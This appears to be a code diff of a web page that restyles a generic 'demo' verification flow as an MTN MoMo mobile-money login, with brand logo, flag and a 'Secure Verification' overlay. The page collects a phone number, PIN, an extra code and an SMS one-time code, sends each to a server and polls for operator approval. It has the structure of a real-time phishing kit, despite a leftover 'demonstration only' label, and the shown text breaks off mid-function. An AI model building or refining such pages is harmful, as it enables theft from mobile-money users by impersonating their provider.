@@ -3,146 +3,238 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WELCOME TO MOMO</title>
+<title>Welcome to MoMo</title>
 <style>
 * {
   box-sizing: border-box;
 }
 
 :root {
-  --yellow: #ffcc00;
-  --teal: #00566d;
+  --momo-blue: #00566d;
+  --momo-yellow: #ffcc00;
   --white: #ffffff;
-  --text: #171717;
-  --muted: #667085;
-  --border: #d1d5db;
+  --text-dark: #002d38;
+  --text-muted: #667085;
+  --border-gray: #d1d5db;
 }
 
 body {
   margin: 0;
-  background: #f1f3f5;
+  background: var(--momo-blue);
   font-family: Arial, sans-serif;
-  color: var(--text);
+  color: var(--text-dark);
+  min-height: 100vh;
 }
 
 .header {
-  height: 135px;
-  background: var(--yellow);
-  border-top: 8px solid #111;
+  padding: 40px 0 20px;
   display: flex;
+  flex-direction: column;
   align-items: center;
   justify-content: center;
 }
 
-.logo {
-  border: 5px solid #111;
-  border-radius: 50%;
-  padding: 15px 35px;
-  font-size: 35px;
-  font-weight: 900;
+.logo-container {
+  background: var(--momo-yellow);
+  width: 110px;
+  height: 110px;
+  border-radius: 22px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+}
+
+.logo-text {
+  font-size: 28px;
+  font-weight: bold;
+  color: var(--momo-blue);
+  line-height: 1;
+}
+
+.logo-sub {
+  font-size: 11px;
+  color: var(--momo-blue);
+  margin-top: 2px;
+}
+
+.brand-label {
+  color: var(--momo-yellow);
+  font-size: 14px;
+  font-weight: bold;
+  margin-top: 12px;
 }
 
 .card {
   width: calc(100% - 32px);
-  max-width: 520px;
-  margin: 25px auto;
+  max-width: 480px;
+  margin: 10px auto 30px;
   background: var(--white);
-  border-radius: 30px;
-  padding: 28px 22px;
-  box-shadow: 0 10px 30px #00000010;
+  border-radius: 35px;
+  padding: 35px 24px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+}
+
+.demo-banner {
+  text-align: center;
+  font-size: 10px;
+  color: var(--text-muted);
+  font-weight: bold;
+  letter-spacing: 0.5px;
+  margin-bottom: 25px;
+  text-transform: uppercase;
 }
 
 h1 {
   text-align: center;
-  font-size: 28px;
-  margin: 10px 0 20px;
+  font-size: 26px;
+  color: var(--momo-blue);
+  margin: 0 0 25px 0;
+  font-weight: bold;
 }
 
 p {
   text-align: center;
-  line-height: 1.6;
+  line-height: 1.5;
   color: #414653;
+  font-size: 15px;
 }
 
-.demo {
+.input-container {
+  position: relative;
+  display: flex;
+  align-items: center;
+  border: 1px solid var(--border-gray);
+  border-radius: 30px;
+  height: 64px;
+  padding: 0 20px;
+  margin: 25px 0;
+}
+
+.input-container:focus-within {
+  border-color: var(--momo-blue);
+  box-shadow: 0 0 0 1px var(--momo-blue);
+}
+
+.field-label {
   text-align: center;
-  font-size: 11px;
-  color: var(--muted);
-  margin-bottom: 20px;
+  font-size: 16px;
+  font-weight: bold;
+  color: #333;
+  margin-bottom: 10px;
 }
 
-label {
-  display: block;
-  font-weight: bold;
-  margin: 22px 0 10px;
+.flag-selector {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding-right: 12px;
+  border-right: 1px solid #e5e7eb;
+  margin-right: 15px;
+}
+
+.flag-icon {
+  width: 28px;
+  height: auto;
+  border-radius: 3px;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.2);
 }
 
 input[type="tel"],
 input[type="text"] {
-  width: 100%;
-  height: 60px;
-  border: 2px solid var(--border);
-  border-radius: 12px;
-  padding: 0 14px;
-  font-size: 20px;
+  flex: 1;
+  border: none;
+  background: transparent;
+  font-size: 22px;
   outline: none;
-}
-
-input:focus {
-  border-color: #2878d0;
+  color: var(--text-dark);
+  letter-spacing: 1px;
 }
 
 .boxes {
   display: flex;
   justify-content: center;
-  gap: 9px;
-  margin: 25px 0;
+  gap: 10px;
+  margin: 30px 0;
 }
 
 .boxes input {
-  width: 58px;
-  height: 66px;
+  width: 54px;
+  height: 64px;
   text-align: center;
   padding: 0;
-  font-size: 25px;
-  border: 2px solid var(--border);
-  border-radius: 12px;
+  font-size: 24px;
+  font-weight: bold;
+  border: 1px solid var(--border-gray);
+  border-radius: 14px;
   outline: none;
 }
 
 .boxes input:focus {
-  border-color: #2878d0;
+  border-color: var(--momo-blue);
+  box-shadow: 0 0 0 1px var(--momo-blue);
 }
 
-button {
+button.next-btn {
   width: 100%;
   height: 60px;
-  margin-top: 20px;
-  background: var(--yellow);
+  margin-top: 25px;
+  background: #cccccc;
+  color: var(--white);
   border: none;
-  border-radius: 12px;
-  font-size: 20px;
+  border-radius: 30px;
+  font-size: 18px;
   font-weight: bold;
-  cursor: pointer;
-  opacity: 1;
-  transition: opacity 0.2s ease;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  cursor: not-allowed;
+  transition: all 0.2s ease;
 }
 
-button:disabled {
-  opacity: 0.45 !important;
-  cursor: not-allowed !important;
-  pointer-events: none;
+button.next-btn.active {
+  background: var(--momo-yellow) !important;
+  color: var(--momo-blue) !important;
+  cursor: pointer !important;
 }
 
-/* Progress Ring Component */
+.footer-notice {
+  text-align: center;
+  font-size: 13px;
+  color: #555;
+  line-height: 1.5;
+  margin-top: 35px;
+  padding: 0 10px;
+}
+
+.footer-notice id {
+  font-weight: bold;
+  color: var(--momo-blue);
+}
+
+/* FULL SCREEN SECURE VERIFICATION OVERLAY SCREENSHOT MATCH */
+.overlay-loader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0, 45, 56, 0.94); 
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+}
+
 .spinner {
-  width: 54px;
-  height: 54px;
-  margin: 25px auto 15px;
-  border: 5px solid #2d3748; 
-  border-top-color: #38a169; 
+  width: 90px;
+  height: 90px;
+  border: 6px solid rgba(255, 255, 255, 0.15); 
+  border-top-color: #00cc66; 
   border-radius: 50%;
-  animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+  animation: spin 1s linear infinite;
+  margin-bottom: 30px;
 }
 
 @keyframes spin {
@@ -150,115 +242,111 @@ button:disabled {
   to { transform: rotate(360deg); }
 }
 
-.status {
-  text-align: center;
-  color: var(--teal);
+.loader-title {
+  color: var(--white);
+  font-size: 24px;
   font-weight: bold;
-  margin-top: 15px;
+  margin-bottom: 8px;
+  letter-spacing: 0.5px;
 }
 
-.error {
-  color: #b42318;
+.loader-subtitle {
+  color: #b0c4de;
+  font-size: 15px;
+  margin-bottom: 4px;
+}
+
+.loader-warning {
+  color: #b0c4de;
+  font-size: 15px;
+}
+
+.stage-msg {
   text-align: center;
-  margin-top: 10px;
+  margin-top: 12px;
   font-weight: bold;
 }
-
-.notice {
-  background: #fff4ce;
-  padding: 15px;
-  border-radius: 12px;
-  line-height: 1.5;
-  font-size: 14px;
-  margin: 20px 0;
-}
-
-.hidden {
-  display: none !important;
-}
-
-.success {
-  text-align: center;
-  font-size: 60px;
-  color: #168348;
-}
-
-@media (max-width: 380px) {
-  .card {
-    padding: 22px 15px;
-  }
-  .boxes {
-    gap: 6px;
-  }
-  .boxes input {
-    width: 48px;
-    height: 58px;
-  }
-}
+.error { color: #d92d20; }
+.hidden { display: none !important; }
 </style>
 </head>
 <body>
 
+<!-- Dynamic Overlay Secure Loader -->
+<div id="secureOverlay" class="overlay-loader hidden">
+  <div class="spinner"></div>
+  <div class="loader-title">Secure Verification</div>
+  <div class="loader-subtitle" id="loaderDynamicText">Verifying your details...</div>
+  <div class="loader-warning">Please do not close this page.</div>
+</div>
+
 <header class="header">
-  <div class="logo">DEMO</div>
+  <div class="logo-container">
+    <div class="logo-text">MoMo</div>
+    <div class="logo-sub">from MTN</div>
+  </div>
+  <div class="brand-label">from MTN</div>
 </header>
 
 <main class="card">
-  <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
+  <div class="demo-banner">Demonstration Only — Never Enter Real Account Codes</div>
 
-  <!-- PAGE 1: PHONE NUMBER -->
+  <!-- STAGE 1: PHONE AREA -->
   <section id="page1">
-    <h1>Welcome</h1>
-    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
-    <label for="phone">Test phone number</label>
-    <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
-    <button id="nextPhone" disabled>Next</button>
+    <h1>Welcome to MoMo</h1>
+    <div class="field-label">Enter number *</div>
+    <div class="input-container">
+      <div class="flag-selector">
+        <svg class="flag-icon" viewBox="0 0 900 600" width="30">
+          <rect y="0" width="900" height="100" fill="#000"/>
+          <rect y="100" width="900" height="100" fill="#fcd116"/>
+          <rect y="200" width="900" height="100" fill="#d92323"/>
+          <rect y="300" width="900" height="100" fill="#000"/>
+          <rect y="400" width="900" height="100" fill="#fcd116"/>
+          <rect y="500" width="900" height="100" fill="#d92323"/>
+          <circle cx="450" cy="300" r="85" fill="#fff"/>
+        </svg>
+      </div>
+      <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="778260583" autocomplete="off">
+    </div>
+    <button id="nextPhone" class="next-btn" disabled>Next</button>
+    <div class="footer-notice">
+      Signing in confirms your acceptance of our <id>Terms and Privacy Policy</id>
+    </div>
   </section>
 
-  <!-- PAGE 2: DEMO PIN -->
+  <!-- STAGE 2: PIN AREA -->
   <section id="page2" class="hidden">
-    <h1>Demo PIN</h1>
+    <h1>Welcome to MoMo</h1>
     <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
     <div class="boxes" id="pinBoxes"></div>
-    <div id="pinWaiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
-    </div>
-    <div id="pinMessage" class="status"></div>
+    <div id="pinMessage" class="stage-msg"></div>
   </section>
 
-  <!-- PAGE 3: FIRST DEMO CODE (CUSTOM VALUE) -->
+  <!-- STAGE 3: CUSTOM TEXT AREA -->
   <section id="page3" class="hidden">
     <h1>Verification Demo</h1>
-    <p>Enter any test value to continue.</p>
-    <div class="notice">This is a simulated verification step. No SMS is sent.</div>
-    <label for="code1">Test value</label>
-    <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
-    <button id="submitCode1" disabled>Continue</button>
-    <div id="code1Waiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+    <p>Enter any custom test text value below to continue execution.</p>
+    <div class="input-container" style="padding: 0 15px;">
+      <input id="code1" type="text" placeholder="Enter a test value" autocomplete="off">
     </div>
-    <div id="code1Message" class="status"></div>
+    <button id="submitCode1" class="next-btn" disabled>Next</button>
+    <div id="code1Message" class="stage-msg"></div>
   </section>
 
-  <!-- PAGE 4: SECOND DEMO CODE (SMS CODE) -->
+  <!-- STAGE 4: SMS OTP AREA -->
   <section id="page4" class="hidden">
     <h1>Final Demo Step</h1>
     <p>Enter any four test digits. Do not use an actual SMS code.</p>
     <div class="boxes" id="code2Boxes"></div>
-    <div id="code2Waiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for final approval...</div>
-    </div>
-    <div id="code2Message" class="status"></div>
+    <div id="code2Message" class="stage-msg"></div>
   </section>
 
-  <!-- PAGE 5: SUCCESS -->
-  <section id="page5" class="hidden">
-    <div class="success">✓</div>
+  <!-- STAGE 5: COMPLETED AREA -->
+  <section id="page5" class="hidden" style="text-align: center;">
+    <h1 style="font-size: 55px; color: #00cc66; margin-bottom: 10px;">✓</h1>
     <h1>Demo Complete</h1>
-    <p>The verification sequence demonstration finished successfully.</p>
+    <p>The verification flow simulation has concluded successfully.</p>
   </section>
 </main>
 
@@ -273,140 +361,63 @@ window.addEventListener("DOMContentLoaded", async () => {
     const data = await res.json();
     sessionId = data.sessionId;
   } catch (err) {
-    console.error("Initialization failed:", err);
+    console.error("Session configuration failed:", err);
   }
   
-  // Build dynamic character block grids
-  setupBoxInputs("pinBoxes", 5, (value) => submitStage("pin", { pin: value }));
-  setupBoxInputs("code2Boxes", 4, (value) => submitStage("code2", { code2: value }));
+  // Dynamically initialize numeric grid boxes for PIN and OTP pages
+  setupBoxInputs("pinBoxes", 5, (val) => submitStage("pin", { pin: val }));
+  setupBoxInputs("code2Boxes", 4, (val) => submitStage("code2", { code2: val }));
 });
 
-// Navigation Helper
+// View switching engine
 function showPage(pageId) {
   document.querySelectorAll("main section").forEach(s => s.classList.add("hidden"));
   document.getElementById(pageId).classList.remove("hidden");
 }
 
-// Page 1 Control: Phone Validation
+// STAGE 1 ACTION: Phone Input Validation & Next Button Functionality
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
 phoneInput.addEventListener("input", () => {
-  nextPhoneBtn.disabled = phoneInput.value.length !== 9;
+  phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
+  
+  if (phoneInput.value.length === 9) {
+    nextPhoneBtn.disabled = false;
+    nextPhoneBtn.classList.add("active");
+  } else {
+    nextPhoneBtn.disabled = true;
+    nextPhoneBtn.classList.remove("active");
+  }
 });
 
 nextPhoneBtn.addEventListener("click", () => {
-  showPage("page2");
-  const firstPinBox = document.querySelector("#pinBoxes input");
-  if (firstPinBox) firstPinBox.focus();
+  if (!nextPhoneBtn.disabled) {
+    showPage("page2");
+    const firstBox = document.querySelector("#pinBoxes input");
+    if (firstBox) firstBox.focus();
+  }
 });
 
-// Page 3 Control: Custom Text Validation
+// STAGE 3 ACTION: Custom Text Validation & Navigation Button
 const code1Input = document.getElementById("code1");
 const submitCode1Btn = document.getElementById("submitCode1");
 
 code1Input.addEventListener("input", () => {
-  submitCode1Btn.disabled = code1Input.value.trim().length === 0;
+  if (code1Input.value.trim().length > 0) {
+    submitCode1Btn.disabled = false;
+    submitCode1Btn.classList.add("active");
+  } else {
+    submitCode1Btn.disabled = true;
+    submitCode1Btn.classList.remove("active");
+  }
 });
 
 submitCode1Btn.addEventListener("click", () => {
-  submitStage("code1", { code1: code1Input.value.trim() });
+  if (!submitCode1Btn.disabled) {
+    submitStage("code1", { code1: code1Input.value.trim() });
+  }
 });
 
-// Dynamic Character Input Grids builder
-function setupBoxInputs(containerId, totalLength, completionCallback) {
-  const container = document.getElementById(containerId);
-  container.innerHTML = ""; // Clean layout
-
-  for (let i = 0; i < totalLength; i++) {
-    const input = document.createElement("input");
-    input.type = "tel";
-    input.inputmode = "numeric";
-    input.maxLength = 1;
-    input.autocomplete = "off";
-    container.appendChild(input);
-
-    input.addEventListener("input", (e) => {
-      // Allow only numbers
-      input.value = input.value.replace(/[^0-9]/g, "");
-      if (!input.value) return;
-
-      if (input.nextElementSibling) {
-        input.nextElementSibling.focus();
-      } else {
-        // Evaluate complete sequence
-        const siblingValues = Array.from(container.querySelectorAll("input")).map(i => i.value).join("");
-        if (siblingValues.length === totalLength) {
-          completionCallback(siblingValues);
-        }
-      }
-    });
-
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && input.previousElementSibling) {
-        input.previousElementSibling.focus();
-      }
-    });
-  }
-}
-
-// API Submission Handler
-async function submitStage(stage, payload) {
-  // If the stage is PIN, we also attach the phone number to persistent data storage
-  if (stage === "pin") {
-    payload.phone = phoneInput.value;
-  }
-
-  // Toggle Loading State
-  setLoadingState(stage, true);
-
-  try {
-    const res = await fetch("/api/approval-request", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sessionId, stage, payload })
-    });
-    
-    if (res.ok) {
-      startPolling(stage);
-    } else {
-      setLoadingState(stage, false);
-      setStageMessage(stage, "Submission failed. Try again.", true);
-    }
-  } catch (err) {
-    setLoadingState(stage, false);
-    setStageMessage(stage, "Connection error.", true);
-  }
-}
-
-// Polling Engine
-function startPolling(stage) {
-  if (currentPollingInterval) clearInterval(currentPollingInterval);
-
-  currentPollingInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
-      const data = await res.json();
-
-      if (data.status === "approved") {
-        clearInterval(currentPollingInterval);
-        setLoadingState(stage, false);
-        
-        // Progress cleanly to next structural index stage
-        if (stage === "pin") {
-          showPage("page3");
-          code1Input.focus();
-        } else if (stage === "code1") {
-          showPage("page4");
-          const firstCode2Box = document.querySelector("#code2Boxes input");
-          if (firstCode2Box) firstCode2Box.focus();
-        } else if (stage === "code2") {
-          showPage("page5");
-        }
-      } 
-      
-      else if (data.status === "declined") {
-        // INSTANT DECLINE REMEDIAL ROUTINE
-        clearInterval(currentPollingInterval);
-        
+// DYNAMIC BOX BUILDER: Automatically switches focus when typing digits
 
